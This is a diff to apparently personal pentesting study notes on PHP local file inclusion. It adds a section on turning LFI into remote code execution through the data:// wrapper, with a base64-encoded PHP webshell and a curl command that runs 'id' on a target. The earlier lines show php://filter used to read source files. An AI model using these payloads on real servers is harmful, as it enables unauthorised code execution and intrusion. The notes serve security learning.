@@ -123,3 +123,17 @@ These are a type of [PHP Wrapper](https://www.php.net/manual/en/wrappers.php.php
 There is four types of filters available to us here: [String Filters](https://www.php.net/manual/en/filters.string.php), [Conversion Filters](https://www.php.net/manual/en/filters.convert.php), [Compression Filters](https://www.php.net/manual/en/filters.compression.php), and [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php). The important filter for LFI attacks is the `convert.base64-encode`, under *Conversion Filters*. We want this filter so we get the source code and not execute it instead.
 
 The first step is to [[ffuf#Page Fuzzing|fuzz]] for php files that we might want to read, we aren't limited to ones that return a `200` too, so `301`, `302`, and `403` are all valid codes to look for. Once we have a list of files we want to view, we can use `php://filter/read=convert.base64-encode/resource=config.php` (*for `config.php`*). This may need to be modified (eg. remove the extension) if there are other filtering protections in place.
+
+## RCE Through LFI
+The [data](https://www.php.net/manual/en/wrappers.data.php) wrapper can be used to load external data, including PHP code. Like many other LFI attacks, this wrapper is only available if the `allow_url_include` setting is enabled in the PHP configuration (*This is NOT enabled by default*). To check this we can use LFI to include the PHP config file (Apache2: `/etc/php/[version X.Y]/apache2/php.ini`, Nginx: `/etc/php/[version X.Y]/fpm/php.ini`). We can iterate through the PHP version until we find the correct one. 
+> We should also use the `convert.base64-encode` filter as the `.ini` file should be encoded when sent. We can then decode to see if the setting is enabled.
+
+We can then use the `data://` wrapper to upload something like a webshell command:
+```bash
+echo '<?php system($_GET["cmd"]); ?>' | base64
+PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
+```
+Then upload it via an LFI attack:
+```bash
+curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
+```
